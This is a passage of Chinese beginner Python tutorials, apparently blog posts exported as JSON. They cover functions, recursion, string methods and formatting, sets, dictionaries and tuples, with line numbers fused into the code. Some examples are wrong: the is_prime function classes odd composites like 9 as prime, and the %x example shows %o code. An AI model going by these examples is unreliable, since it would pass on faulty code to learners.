写一个打招呼的函数def greeting(): print(&#x27;hi,My name is Mr_lee!&#x27;) 2、函数的调用12greeting() # 函数名（）greeting() # 多次调用 函数的运行机制 1234567891011121314# Python代码是从下往下逐行执行a = 5b = 10print(a,b)# 执行到这里时，函数内部的代码并不会被执行def greeting(): print(&#x27;hi,My name is Mr_lee!&#x27;) print(&quot;函数已经定义了&quot;)greeting() # 函数调用时，会跳转到函数定义的地方，进入函数内部，执行里面的代码，执行完毕后再跳回到函数调用的地方，继续执行后面的代码print(&quot;over&quot;) # 调用完greeting函数后，执行over 程序的运行结果： 12345 10函数已经定义了hi,My name is Mr_lee!over 12# Python内置了一些函数 Python的作者len([2,3,4]) # 函数的调用 三、函数的参数和返回值1、函数的参数可以把函数比作一个加工厂（面包加工厂），加工厂只负责加工产品，在加工产品需要有原材料，而原材料一般都由外界提供 12345def add(): a = int(input(&quot;请输入第一个数：&quot;)) # 原材料是在加工厂内部产生 b = int(input(&quot;请输入第二个数：&quot;)) c = a + b print(f&quot;&#123;a&#125;+&#123;b&#125;=&#123;c&#125;&quot;) 修改后： 1234567def add(a,b): c = a + b print(c) x = 3y = 5add(x,y) # 当调用函数时，从外界把数据传递给函数 形参：形式参数，函数定义时的参数。最开始没有值，值是从实参传过来 实参：函数调用时，实际传递给函数的参数 （实参传给形参） 2、函数的返回值函数相当于一个加工厂，加工厂加工完产品之后，需要送出去 12345def add(a,b): c = a + b print(c) add(3,5) 修改后： 12345678910def add(a, b): c = a + b return c # return 返回result = add(3, 5) print(result)# 这里并不是把函数赋值给变量result 而是将函数的返回值赋值给result result = cresult = add() # error 定义了形参 调用函数时传递的实参的个数要和形参的个数保持一致print(result) 1234# len()函数的用法t = [2,4,6,8]l = len(t)print(l) 如果函数没有定义返回值，默认返回为None return None 小结： 函数的几个基本形式： 没有参数，也没有返回值 1234def func(): print(&#x27;this is a function~~~&#x27;) func() 有参数，但没有返回值 1234def func(a,b,c): print(a,b,c) func(2,3,5) # 实参的个数要和形参的个数保持一致 有参数，也有返回值 12345678def func(a,b): return a+bfunc(3,5)result = func(3,5)print(result)print(func(3,5))print(func) 四、参数的详解1、位置参数123456def add(a, b): return a + bresult = add(5,10) # 形参的实参的个数、位置是一一对应的 5-&gt;a 10-&gt;bprint(result) 2、关键字参数12345678910def add(a, b): print(a,b) return a + bresult = add(5,10) # a=5 b=10print(result)# 调用函数时，通过关键字的形式给形参赋值result = add(b=5,a=10) # a=10 b=5print(result) 位置参数和关键字参数混合时需要注意： 保证每一个形参都可以获取到值 位置参数要放在关键字参数的前面 3、参数（形参）的默认值定义函数时，可以给函数的形参赋一个默认的值 给所有的形参默认值 1234567891011121314def add(a=3,b=5): return a+b# 1. 调用函数时，不传递实参result = add() # 8print(result)# 2. 参数一个实参，赋值时是从左向右进行 位置参数 所以1赋值给了aresult = add(1) # 6print(result)# 3. 传两个参数，把a和b的值覆盖掉result = add(2,3) # 5print(result) 给一部分形参默认值 123456# 前一参数有了默认值，后面所有的形参都必须有默认值def add(a,b=5,c=3): return a+b result = add(3)print(result) 4、可变长参数定义函数时，不确定将来函数调用时会传递多少个参数 *args ：函数调用时，传递的实参不受个数的限制，实参会被存放在元组中-args 123456789def f(*args): # 形参名：约定俗成 也可以定义成其它的名字 print(args) for i in args: print(i)f(1)f(1, 2, 3)f(1, 2, 3, 4, 5, 6, 7, 8, 9, 90, 0) **kwargs： 可变长的关键字参数，函数调用时使用关键字参数传参，kwargs会生成为字典 123456def f(**kwargs): print(kwargs) print(kwargs[&#x27;a&#x27;])f(a=1, b=2, c=3) 可变长位置参数和关键字参数混合使用 1234567def f(*args, **kwargs): print(args) print(kwargs)f(1, 2, 3)f(1, 2, 3, x=4, y=5, z=6)f(x=4, y=5, z=6) 函数注释: 12345678def add(a,b): &quot;&quot;&quot; 这是一个两个数相加的函数 :param a: 第一个参数 :param b: 第二个参数 :return: 返回两个数相加的和 &quot;&quot;&quot; return a+b 练习： 写一个函数，实现输入一个整数n，求它的阶乘 123456789101112def f(n): factorial = 1 for i in range(1, n + 1): factorial *= i return factorial# 1. 输入数据# 2. 调用函数# 3. 输入结果a = int(input(&#x27;请输入一个整数n:&#x27;))factor = f(a)print(factor) 五、函数的嵌套调用函数的嵌套调用是指在一个函数中，调用另一个函数 12345678def f1(): print(123) def f2(): print(456) f1() f2() 什么情况下会使用到函数的嵌套调用： ​ 一个函数的功能实现比较复杂，可以将该函数再分解为若干个小的功能模块（函数） 123456789101112131415161718# 打印1-100以内所有的质数# 判断是不是质数def is_prime(n): for i in range(2, int(n ** 0.5) + 1): if n % i == 0: return False else: return True# 打印100以内的质数def print_prime(): for i in range(2,100): if is_prime(i): print(f&#x27;&#123;i&#125;是质数&#x27;)print_prime() 六、内嵌函数内嵌/内置/内部函数 inner function ： 在一个函数的内部，再去定义另一个函数 123456def f1(): print(&#x27;this is f1&#x27;) def f2(): print(&#x27;this is f2&#x27;) f1() # 只输出f1 12345678910def f1(): print(&#x27;this is f1&#x27;) def f2(): # f2只在f1函数的内部是可见的 print(&#x27;this is f2&#x27;) f2()f1() # 输出f1 和 f2 七、递归函数递归：一个函数调用它自身 (画中画) 12345def func(): print(&#x27;哈哈哈哈&#x27;) func()func() 1234567# 递归求n!def factorial(n): if n &lt;= 1: return 1 return n * factorial(n - 1)print(factorial(5)) 123456789101112131415161718# 不用递归a = 1b = 1for i in range(10): #a,b = b,a+b result = a + b a = b b = result print(result) # 递归求斐波那契数列def fib(n): if n &lt;= 2: return 1 return fib(n-1) + fib(n-2) # f(4) = f(3)+f(2)for i in range(1,11): print(fib(i))","categories":[],"tags":[]},{"title":"","slug":"07 字符串","date":"2024-10-24T11:20:58.308Z","updated":"2024-10-07T05:21:01.294Z","comments":true,"path":"2024/10/24/07 字符串/","permalink":"http://example.com/2024/10/24/07%20%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"字符串一、字符串简介字符串是编程世界中最常用的一个数据类型，它表示一个文本，例如表示一个人的名字”Mr_lee”。 在Python字符串需要使用引号来包围。可以是单引号、双引号或三引号 12345678910# 单引号、双引号用来表示单行字符串 s = &quot;Tom\\nJack&quot; print(s)s1 = &#x27;Tom&#x27;s2 = &quot;Tom&quot; # 三引号一般用来表示多行字符串s3 = &#x27;&#x27;&#x27;Tom&#x27;&#x27;&#x27;s4 = &quot;&quot;&quot;TomJack&quot;&quot;&quot; 字符串的特点： 具有天生的跨平台的特性（C、C++、Java…） 是一个序列（有序的数列） 支持下标操作 支持切片 可迭代对象 不可变类型 s = &#39;abc&#39; s= &#39;Tom&#39; 并不是修改了内容而是修改了指向 123456789101112131415161718s = &quot;String&quot;print(s)s[3] = &#x27;o&#x27; # 不可修改内容 Errorprint(s)s = &quot;Strong&quot;print(s) # 改变指向a = 5print(id(a)) # 1871015072a = 10print(id(a)) # 1871015232 # 指向发生了改变a = [1,2]print(id(a)) # 41174664 a[0] = 10 # 修改列表的内容-元素 列表的指向并没有发生改变print(id(a)) # 41174664 Python中的字符串与C、C++的不同之处： Python没有单字符，所有的单字符也是当作字符串进行处理 s = &#39;a&#39; s = &quot;a&quot; 它们都是字符串 类型都是str 而C、C++中 ‘’表示的为单字符，而“”表示的为字符串 char s = &#39;A&#39; string s = &quot;ABC&quot; 类型不一样 二、字符串的创建 直接创建 12s = &#x27;abc&#x27;print(s) # 大多数情况下使用 工厂函数 12345678910111213141516s1 = str()print(s1) # -&gt; &#x27;&#x27; 空字符串 长度为0s2 = str(&#x27; &#x27;)print(s2) # 空格 长度为1s3 = str(123)print(s3) # 将int 转为 字符串strs4 = str(123.4) # -&gt; &#x27;123.4&#x27; 字符串在使用print输出时，不会显示引号s5 = str(True) # -&gt; &#x27;True&#x27;s6 = str(None) # -&gt; &#x27;None&#x27;s7 = str([1,2,3]) # -&gt; &#x27;[1,2,3]&#x27;# 补充： eval()# print(eval(&quot;1+2&quot;)) -&gt; 3 eval(&quot;[1,2,3,4]&quot;) -&gt; [1,2,3,4] 三、字符串的访问可以通过下标或切片来获取字符串中的内容 1234567s = &#x27;Hello World&#x27;print(s[0])print(s[:])print(s[1:])for i in s: print(i,end=&#x27;,&#x27;) # H,e,l,l..... 四、字符串运算符123456789101112131415161718191. + 实现字符串的拼接 s1 = &#x27;Hello&#x27; s2 = &#x27;world&#x27; s3 = s1 + s2 # &#x27;Helloworld&#x27; # 字符串不能和整数直接相加 2. * 实现字符串重复 s1 = &#x27;*&#x27; s2 = &#x27;*&#x27; * 3 print(s2) # &#x27;***&#x27; 3. in/not in 判断是否存在 s = &#x27;HelloWorld&#x27; print(&#x27;l&#x27; in s) # True print(&#x27;ll&#x27; in s) # True4. r/R print(&quot;ABC\\nDEF&quot;) # ABC 这里会换行 DEF print(r&quot;ABC\\nDEF&quot;) # ABC\\nDEF 原样输出 输出原始字符串 五、字符串中的方法 大小写转换 s.capitalize() : 将首字母转为大写 123s = &#x27;helloworld&#x27;print(s.capitalize()) # -&gt; Helloworld 转换后生成新的字符串print(s) # -&gt; helloworld 原字符串不变 s.lower()： 将字符串转为小写 1print(&quot;HelloWorld&quot;.lower()) # -&gt; helloworld s.upper()：将字符串转为大写 1print(&quot;helloworld&quot;.upper()) # -&gt; HELLOWORLD s.swapcase()：翻转大小写 1print(&quot;HelloWorld&quot;.swapcase()) # -&gt; hELLOwORLD s.title() ：标题化字符串，将所有单词的首字母转为大写，其余的小写 1print(&quot;hello world&quot;.title()) # -&gt; Hello World s.casefold() ： 全部转为小写 – 类似于lower() 功能比lower更强大 12print(&quot;ΕΖΗ&quot;.lower()) # εζηprint(&quot;ΕΖΗ&quot;.casefold()) # εζη 字符串样式 s.center(width[,fillchar]) 返回一个字符串居中，并使用空格来填充至长度为width的新字符串，fillchar为可选参数，表示要填充的内容 123s = &quot;helloworld&quot;print(s.center(20)) # -&gt; &#x27; helloworld &#x27;print(s.center(20,&#x27;*&#x27;)) # -&gt; &#x27;*****helloworld*****&#x27; s.ljust(width[,fillchar]) ：返回一个字符串左对齐，使用空格填充至长度为width的新字符串 123s = &quot;helloworld&quot;print(s.ljust(20)) # -&gt; &#x27;helloworld &#x27;print(s.ljust(20,&#x27;*&#x27;)) # -&gt; &#x27;helloworld**********&#x27; s.rjust(width[,fillchar]) ：返回一个字符串右对齐，使用空格填充至长度为width的新字符串 123s = &quot;helloworld&quot;print(s.rjust(20)) # -&gt; &#x27; helloworld&#x27;print(s.rjust(20,&#x27;*&#x27;)) # -&gt; &#x27;**********helloworld&#x27; s.zfill(width)： 返回一个长度为width的字符串，右对齐，前面使用0填充 12s = &quot;helloworld&quot;print(s.zfill(20)) # -&gt; 0000000000helloworld s.expandtabs()：设置制表符的长度 默认为8 12s = &quot;hello\\tworld\\ta\\tb&quot;print(s.expandtabs()) # hello world a b 搜索字符串 s.count(sub[,start[,end]]) ：在指定范围内查找子串的个数 12345s = &quot;helloworld&quot;print(s.count(&#x27;l&#x27;)) # -&gt; 3print(s.count(&#x27;lo&#x27;)) # -&gt; 1print(s.count(&#x27;l&#x27;,5)) # -&gt; 1print(s.count(&#x27;l&#x27;,1,5)) # -&gt; 2 s.find(sub[,start[,end]]) 在指定范围内查找第一个子串的位置，未找到则返回-1 12345s = &quot;helloworld&quot;print(s.find(&#x27;l&#x27;)) # -&gt; 2print(s.find(&#x27;L&#x27;)) # -&gt; -1print(s.find(&#x27;l&#x27;,5)) # -&gt; 8print(s.find(&#x27;l&#x27;,2,5)) # -&gt; 2 s.index(sub[,start[,end]]) 在指定范围内查找子串的位置，未找到时报错 123s = &quot;helloworld&quot;print(s.index(&#x27;l&#x27;))print(s.index(&#x27;L&#x27;)) # ValueError: substring not found 替换字符串 s.replace(old,new[,count]) 使用new来替换old子串，count用于指定要替换的个数，默认替换所有 1234s = &quot;helloworld&quot;print(s.replace(&#x27;l&#x27;,&#x27;a&#x27;)) # -&gt; heaaoworadprint(s.replace(&#x27;l&#x27;,&#x27;a&#x27;,1)) # -&gt; healoworldprint(&quot;a,b,c,d,e&quot;.replace(&#x27;,&#x27;,&#x27;&#x27;)) # abcde s.strip([chars])：删除字符串两边的字符，默认是空格 12345s = &quot; Tom &quot;print(s.strip()) # -&gt; &#x27;Tom&#x27;s = &#x27;**Tom**&#x27;print(s.strip(&#x27;*&#x27;)) # -&gt; &#x27;Tom&#x27; s.lstrip([chars]) / s.rstrip([chars]) : 删除左边 或 删除右边的空格或指定的字符 12345s = &quot; Tom &quot;print(s.lstrip()) # -&gt; &#x27;Tom &#x27;s = &#x27;**Tom**&#x27;print(s.lstrip(&#x27;*&#x27;)) # -&gt; &#x27;Tom**&#x27; 字符串联合 s.join(iterable) ： 使用s来连接可迭代对象生成新的字符串 1print(&quot;-&quot;.join(&quot;abc&quot;)) 字符串分隔 s.split(sep,max=-1) 用指定的字符来对原字符串进行分隔 123s = &quot;hello world haha&quot;print(s.split()) # [&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;haha&#x27;] # 默认以空格分隔print(s.split(&quot; &quot;,1)) # [&#x27;hello&#x27;, &#x27;world haha&#x27;] 判断前缀和后缀 s.startswith(prefix) 判断某个字符串是否有某个前缀 12s = &quot;http://www.baidu.com&quot;print(s.startswith(&#x27;http&#x27;)) s.endswith(suffix[start,[stop]]) 判断是否有某个后缀 12s = &quot;http://www.baidu.com&quot;print(s.endswith(&#x27;.com&#x27;)) 判断是否是某种类型 1234567891011121314151617181920212223242526272829303132333435363738394041# 1. isalpha() 所有字符是否都为字母 s = &quot;abc&quot;print(s.isalpha()) # Trues = &quot;123&quot;print(s.isalpha()) # Falses = &quot;abc123&quot;print(s.isalpha()) # False# 2. isalnum() 是否都为字母或数字组成print(&quot;abc123&quot;.isalnum()) # Trueprint(&quot;abc&quot;.isalnum()) # Trueprint(&quot;123&quot;.isalnum()) # Trueprint(&quot;123,&quot;.isalnum()) # False# 3. isdigit() 是否为数字 0-9print(&quot;abc&quot;.isdigit()) # Falseprint(&quot;123&quot;.isdigit()) # Trueprint(&quot;123.123&quot;.isdigit()) # False 0-9print(&quot;abc123&quot;.isdigit()) # False# 4. isnumeric() 是否为数字 功能比isdigit强大 计数字符 print(&quot;⑵&quot;.isnumeric()) # Trueprint(&quot;123&quot;.isnumeric()) # Trueprint(&quot;壹&quot;.isnumeric()) # Trueprint(&quot;Ⅱ&quot;.isnumeric()) # Trueprint(&quot;壹&quot;.isdigit()) # False# 5. isspace() 是否全为空格print(&quot; &quot;.isspace())# 6. islower() / isupper() 是否全为小写或大写print(&quot;abc&quot;.islower()) # Trueprint(&quot;ABC&quot;.islower()) # Falseprint(&quot;ABC&quot;.isupper()) # Trueprint(&quot;abc&quot;.isupper()) # False# 7. isdecimal() 是否为十进制的数print(&quot;123&quot;.isdecimal()) # True 六、字符串的格式化在程序中，可能需要得到或输出这样的一个字符串“亲爱的xxx用户你好！你xx月的话费是x” 12345a = &quot;中国联通&quot;month = 6money = 128print(&quot;亲爱的&quot;+a+&quot;用户你好！你&quot;+str(month)+&quot;月的话费是&quot;+str(money))# -&gt; 亲爱的中国联通用户你好！你6月的话费是128 在Python中可以使用一种简便的格式化字符串的方式来将某些变量的值插入到固定格式的字符串。 12345a = &quot;中国联通&quot;month = 6money = 128s = &quot;亲爱的%s用户你好！你%d月的话费是%d&quot;%(a,month,money)print(s) 1234567891011121314151. %d 格式化整数2. %f 格式化小数3. %s 格式字符串（也可以是其它类型）4. %c 格式化字符或ASCII print(&quot;%c,,,,,,%c&quot;%(65,66)) #-&gt; A,,,,,,B5. %e 科学计数法 print(&quot;a=%d&quot;%123) # a=123 print(&quot;a=%e&quot;%123) # a=1.230000e+026. %o 格式化八进制 print(&quot;%o&quot;%10) # 12 print(&quot;%#o&quot;%10) # 0o127. %x 格式化为十六进制 print(&quot;%o&quot;%10) # 12 print(&quot;%#o&quot;%10) # 0o12 print(&quot;%d&quot;%0xf) # 将16进制的转为10进制 12345678910111213141516171819202122232425# 特殊用法：# .n 保留几位小数# m.n 一共占几位# - 左对齐# 10d 数字占10位# 010d 不够用0补print(&quot;%f&quot;%3.1415926535897)print(&quot;%.2f&quot;%3.1415926535897)print(&quot;%10.2f&quot;%3.1415926535897) # 一共占10位 不够用空格补 补前面 右对齐print(&quot;%-10.2f&quot;%3.1415926535897) # -号 左对齐print(&quot;%10d&quot;%3)for i in range(20): print(&quot;%2d&quot;%i)for i in range(20): print(&quot;%02d&quot; % i) # 位数不够用0补for i in range(1,10): for j in range(1,i+1): print(&quot;%d * %d = %02d &quot;%(j,i,i*j),end=&#x27;&#x27;) print() 另一种格式化方式： format 形式： “{},{}”.format(参数1,参数2) 使用{}来表示占位 123456789a = 5b = 10c = 20print(&quot;a=%d,b=%d&quot;%(a,b)) # &#x27;a=5,b=10&#x27;print(&quot;a=&#123;&#125;,b=&#123;&#125;&quot;.format(a,b))print(&quot;a=&#123;0&#125;,c=&#123;2&#125;,b=&#123;1&#125;&quot;.format(a,b,c))# 关键字参数print(&quot;&#123;url&#125;,&#123;name&#125;&quot;.format(name=&quot;Python教程&quot;,url=&quot;www.baizhiedu.cn&quot;)) Python3.6之后，新加了一种格式化的方式： 12345678910111213a = 50b = 10print(f&#x27;&#123;a&#125;&#123;b&#125;&#x27;) # 直接引用变量a和bprint(f&#x27;&#123;a+b&#125;&#x27;)print(f&#x27;&#123;a//b&#125;&#x27;) # 参与运算for i in range(1,10): for j in range(1,i+1): print(f&#x27;&#123;j&#125;*&#123;i&#125;=&#123;i*j:2d&#125; &#x27;,end=&#x27;&#x27;) print()pi = 3.14159265397 print(f&quot;&#123;pi:.2f&#125;&quot;)","categories":[],"tags":[]},{"title":"","slug":"06-2 集合","date":"2024-10-24T11:20:58.307Z","updated":"2024-10-07T05:21:02.406Z","comments":true,"path":"2024/10/24/06-2 集合/","permalink":"http://example.com/2024/10/24/06-2%20%E9%9B%86%E5%90%88/","excerpt":"","text":"集合一、什么是集合 集合也是Python内置的一个数据类型，可以存储多个元素的容器 无序 不允许有重复的元素 可变类型 也是使用{}来表示的 （集合是一种特殊的字典 kv是同一个）eg： s &#x3D; {1,2,3} 不支持下标访问 不支持切片操作 二、集合的创建 使用{}创建 123456s = &#123;&#125; # 创建的不是空集合，而是空字典print(type(s)) # -&gt; &lt;class &#x27;dict&#x27;&gt;s = &#123;1&#125; # 创建一个包含一个元素的集合print(s)print(type(s)) # &lt;class &#x27;set&#x27;&gt; 使用工厂函数 12345678s = set() # 空集合print(s) # set()# 使用可迭代对象创建集合s = set(&#x27;helloworld&#x27;)s = set([1,2,3,5])s = set((1,2,3,4))s = set(range(10)) 三、集合的基本操作1、添加元素 基本形式：s.add（x） 作用：将元素x添加到集合s中，如果x已经存在，则什么都不做 1234s = set()s.add(1)s.add(2)print(s) # -&gt; &#123;1,2&#125; 基本形式：s.update(iterable) 作用：使用可迭代对象来更新集合s 1234567s.update(&#123;3,4&#125;)print(s) # &#123;1, 2, 3, 4&#125;s.update(&#x27;helloworld&#x27;)print(s)s.update([5,6]) # &#123;1, 2, 3, 4, &#x27;r&#x27;, 5, &#x27;h&#x27;, 6, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;d&#x27;, &#x27;o&#x27;, &#x27;w&#x27;&#125;print(s) 2、删除元素 基本形式：s.remove(x) 作用：移除集合s中的x元素，如果元素不存在，则报错 123456s = &#123;1, 2, 3, 4&#125;s.remove(2) print(s) # -&gt; &#123;1, 3, 4&#125;s.remove(2)print(s) # -&gt; KeyError 基本形式： s.discard(x) 作用：移除集合s中的x元素，如果元素不存在，则什么都不做 不报错 123s = &#123;1, 2, 3, 4&#125;s.discard(5) print(s) # 不报错 基本形式：s.pop() 作用：随机移除并返回一个元素 123s = &#123;&#x27;B&#x27;,&#x27;A&#x27;,&#x27;T&#x27;&#125;for i in range(len(s)): print(s.pop()) 3、清空元素 基本形式：s.clear() 作用：清空集合中的元素 123s = &#123;&#x27;B&#x27;,&#x27;A&#x27;,&#x27;T&#x27;&#125;s.clear()print(s) # -&gt; set() 4、判断元素是否存在 基本形式：x in s 或 x not in s 1234s = &#123;&#x27;B&#x27;,&#x27;A&#x27;,&#x27;T&#x27;&#125;print(&#x27;B&#x27; in s) # -&gt; Trueif &#x27;C&#x27; in s: xx 5、拷贝集合 基本形式：s2 = s1.copy() 作用：拷贝出一个集合 – 浅拷贝 123s1 = &#123;&#x27;B&#x27;,&#x27;A&#x27;,&#x27;T&#x27;&#125;s2 = s1.copy()print(id(s1),id(s2)) 6、子集和超集123456s1 = &#123;1,2&#125;s2 = &#123;1,2,3&#125;print(s1.issubset(s2)) # True 子集print(&#123;1,2,3&#125;.issubset(s2)) # True 子集print(&#123;1,2,3&#125;.issuperset(s1)) # True 超集print(&#123;1&#125;.issuperset(s1)) # False 四、交集、并集、差集…1234567s1 = &#123;1,2,3&#125;s2 = &#123;3,4,5&#125;print(s1.intersection(s2)) # &#123;3&#125; 交集print(s1.union(s2)) # &#123;1, 2, 3, 4, 5&#125; 并集print(s1.difference(s2)) # &#123;1,2&#125; 差集print(s2.difference(s1)) # &#123;4,5&#125; 差集 五、不可变集合1234# 关键字： frozenset1. frozenset() 只能使用工厂函数构造一个不可变集合2. frozenset(iterable) 使用可迭代对象构造一个不可变集合","categories":[],"tags":[]},{"title":"","slug":"06-1 字典","date":"2024-10-24T11:20:58.305Z","updated":"2024-10-07T05:21:03.219Z","comments":true,"path":"2024/10/24/06-1 字典/","permalink":"http://example.com/2024/10/24/06-1%20%E5%AD%97%E5%85%B8/","excerpt":"","text":"字典一、什么是字典 Python中的字典是另一种可变容器 可以存储任意类型的数据 列表：将多个数据存储在一个有序的容器中，并且通过下标&#x2F;索引形式来访问 字典：将多个数据存储在一个“无序”的容器中（Python3.5是无序的，在Python3.6中有序），并且通过“名字”来访问。 什么情况下会使用字典： 1234567891011# 存储三门课的成绩# 语文：79 数学：80 英语：92s1 = [79,80,92]s2 = [&#x27;语文&#x27;,&#x27;数学&#x27;,&#x27;英语&#x27;] # 列表是 下标和值绑定print(s2[0],s1[0])# 产生一个 一 一对应关系（映射） -- 字典 键和值绑定scores = &#123;&#x27;语文&#x27;:79, &#x27;数学&#x27;:80, &#x27;英语&#x27;:92&#125;# 声明了一个字典，有3个元素，每一个元素都由两部分组成，key:value 键：值print(scores[&#x27;语文&#x27;]) 存储一个人的信息 姓名：Mr_lee 年龄：18 性别：True 列表： info = [&#39;Mr_lee&#39;,18,True] info[0] 字典：info = &#123;&#39;name&#39;:&#39;Mr_lee&#39;, &#39;age&#39;:18, &#39;gender&#39;:True&#125; info[&#39;name&#39;] 二、字典的创建 直接使用{}来创建 1234d1 = &#123;&#125; # 构造了一个空字典print(type(d1)) # dict -- dictionaryd2 = &#123;&#x27;A&#x27;: 1, &#x27;C&#x27;: 3, &#x27;B&#x27;: 2,&#125; # 存储多个键值对 Python3.6 存储的先后顺序排序print(d2) 工厂函数 1234567891011121314151617# 1. 空字典d = dict() # 空字典# 2. 使用映射构造d = dict(&#123;&#x27;A&#x27;: 1, &#x27;C&#x27;: 3, &#x27;B&#x27;: 2,&#125; ) # l = list([1,2,3])# 3. 使用可迭代对象构造d = dict([1,2,3]) # 不行# 如果使用可迭代对象作为参数构造字典，要求可迭代对象中的每一个元素由两个子元素构造d = dict([(&#x27;A&#x27;,1),(&#x27;B&#x27;,2)]) d = dict([&#x27;A1&#x27;,&#x27;B2&#x27;]) # &#123;&#x27;A&#x27;: &#x27;1&#x27;, &#x27;B&#x27;: &#x27;2&#x27;&#125;print(d) # 4. 可以使用关键字参数构造字典d = dict(a=1,b=2,c=3)print(d) # &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125; 三、字典的访问 列表是通过下标索引的方式来访问它的元素的，而字典则是通过键名来获取对应的值 123456789101112131415info = &#123;&#x27;id&#x27;:1, &#x27;name&#x27;:&#x27;Mr_lee&#x27;, &#x27;age&#x27;:18, &#x27;age&#x27;:20&#125; # 不允许有重复的键 不报错 会发生覆盖print(info[&#x27;name&#x27;])print(info[&#x27;Name&#x27;]) # KeyError: &#x27;Name&#x27; 当键不存在时，访问报错 # 解决键不存在时，访问键对应的值时，程序出错： get函数n = info.get(&#x27;Name&#x27;) # 当键不存在时，返回为Noneprint(n) # Nonen = info.get(&#x27;NAME&#x27;,&#x27;Tom&#x27;) # 当键不存在时，返回第二个参数的值（默认的值）print(n) # Tomn = info.get(&#x27;name&#x27;,&#x27;Tom&#x27;)print(n) # Mr_lee 注意：字典中的键一般都是字符串 ，键必须是不可变类型 1234d = &#123;1:1,2:2,3:3&#125; # 可以d = &#123;&#x27;A&#x27;: 1, &#x27;C&#x27;: 3, &#x27;B&#x27;: 2,&#125; # 可以d = &#123;(1,):1,(2,):2&#125; # 可以 使用元组作为键，要求元组中的元素也必须不可变类型d = &#123;[1,]:1,[2,]:2&#125; # 不可以 四、修改和添加元素1234567info = &#123;&#x27;id&#x27;:1, &#x27;name&#x27;:&#x27;Mr_lee&#x27;, &#x27;age&#x27;:18&#125;id = info.get(&#x27;id&#x27;) # 作为右值print(id)id = info[&#x27;id&#x27;] # 作为右值print(id) 修改数据 1234# 当键存在时，并作为左值，则是修改它的值info[&#x27;id&#x27;] = 100 # 作为左值，修改它的值 s[0] = 100 print(info) # &#123;&#x27;id&#x27;:100, &#x27;name&#x27;:&#x27;Mr_lee&#x27;, &#x27;age&#x27;:18&#125; 添加数据 123# 当键不存在时，作为左值，添加一个键值对info[&#x27;gender&#x27;] = True # &#123;&#x27;id&#x27;: 100, &#x27;name&#x27;: &#x27;Mr_lee&#x27;, &#x27;age&#x27;: 18, &#x27;gender&#x27;: True&#125;print(info) 五、字典常用的方法 函数 描述 d.clear() 清空字典中的所有的元素 d.pop(key) 删除指定键对应的值（kv一起被删除） d.popitem() 随机移除并返回被移除的键值对 类型是一个元组(k,v) d.get(key,default) 返回指定键对应的值，当键不存在时，返回为空，如果给了default则当键不存在时，返回default的值 d.items() 以列表的形式返回所有的键值对，列表中的每一个元素都是一个元组包含一个键和值 dict_items([(&#39;id&#39;, 1), (&#39;name&#39;, &#39;Mr_lee&#39;), (&#39;age&#39;, 18)]) d.keys() 返回所有的键 d.values() 返回所有的值 d1.update(d2) 用一个字典&#x2F;可迭代对象来更新另一个字典 d.copy() 拷贝一个字典 删除和清空 123456789info.clear() # 清空print(info)v = info.pop(&#x27;name&#x27;) # 移除指定的键和值 返回对应的值print(v)print(info) # &#123;&#x27;id&#x27;: 1, &#x27;age&#x27;: 18&#125;item = info.popitem() # 随机返回一个键值对 tuple 如果字典为空，则KeyErrorprint(item) 获取值 12345678910111213info = &#123;&#x27;id&#x27;:1, &#x27;name&#x27;:&#x27;Mr_lee&#x27;, &#x27;age&#x27;:18, &#x27;age&#x27;:20&#125;print(info)# print(info[&#x27;Name&#x27;]) # KeyError: &#x27;Name&#x27;n = info.get(&#x27;Name&#x27;) # 当键不存在时，返回为Noneprint(n) # Nonen = info.get(&#x27;NAME&#x27;,&#x27;Tom&#x27;) # 当键不存在时，返回第二个参数的值（默认的值）print(n) # Tomn = info.get(&#x27;name&#x27;,&#x27;Tom&#x27;)print(n) # Mr_lee 返回所有的键值对 123456items = info.items()print(items) # dict_items([(&#x27;id&#x27;, 1), (&#x27;name&#x27;, &#x27;Mr_lee&#x27;), (&#x27;age&#x27;, 18)])print(list(items)) # [(&#x27;id&#x27;, 1), (&#x27;name&#x27;, &#x27;Mr_lee&#x27;), (&#x27;age&#x27;, 18)]for k,v in list(items): print(k,v) 返回所有的键 或 返回所有的值 123456print(info.keys())# dict_keys([&#x27;id&#x27;, &#x27;name&#x27;, &#x27;age&#x27;]) 可迭代对象 可以转为listfor key in info.keys(): print(key)print(info.values()) update函数 1234567info = &#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;Mr_lee&#x27;, &#x27;age&#x27;: 18&#125;d = &#123;&#x27;height&#x27;: 180, &#x27;weight&#x27;: 180&#125;info.update(d) # 类似于列表中的extendinfo.update([&#x27;A1&#x27;, &#x27;B2&#x27;])print(info) 字典的遍历 123456789101112# 3.5/3.6info = &#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;Mr_lee&#x27;, &#x27;age&#x27;: 18&#125;info = &#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;Mr_lee&#x27;, &#x27;age&#x27;: 18&#125;for k in info: # 默认获取的是键 key print(k,info.get(k)) for k in info.keys(): print(k)for k,v in info.items(): # 一次性获取所有的键值对 print(k,v)","categories":[],"tags":[]},{"title":"","slug":"05-2 元组","date":"2024-10-24T11:20:58.303Z","updated":"2024-10-07T05:21:03.010Z","comments":true,"path":"2024/10/24/05-2 元组/","permalink":"http://example.com/2024/10/24/05-2%20%E5%85%83%E7%BB%84/","excerpt":"","text":"元组一、什么是元组 元组是一系列不可变的Python对象，元组也是一个序列（容器&#x2F;可迭代），类似于列表可以存储多个数据。 元组和列表的区别： 元组不能像列表一样修改元素，不能做增删改操作，可以把元组当作一个”只读列表“。 12345# 列表是用 [] 表示n = [2,4,6,8,22]# 而元组是使用()表示t = (2,4,6,8,22) 二、元组的创建 直接创建 123456789101112t = (2,4,6,8,22) print(t)t = () # l = [] 它是一个空列表 t=()它是一个空元组 t = (1) print(t) # 这不是一个元组t = (1,) # 如果只有一个元素时，需要在元素后面添加一个逗号t = 1,2,3 # 省略圆括号print(t) 工厂函数 类型名() eg: int() str() list() 12345678910111213# 列表l = list() # 空列表l = list(&#x27;helloworld&#x27;) # 10个元素l = list([2,3,4]) # 可迭代对象# 元组t = tuple() # 空元组# tuple(iterable) 参数为可迭代对象即可t = tuple((1,2,3)) t = tuple([1,2,3])t = tuple(&#x27;helloworld&#x27;)t = tuple(range(10)) 三、元组的一些操作12345678910t = 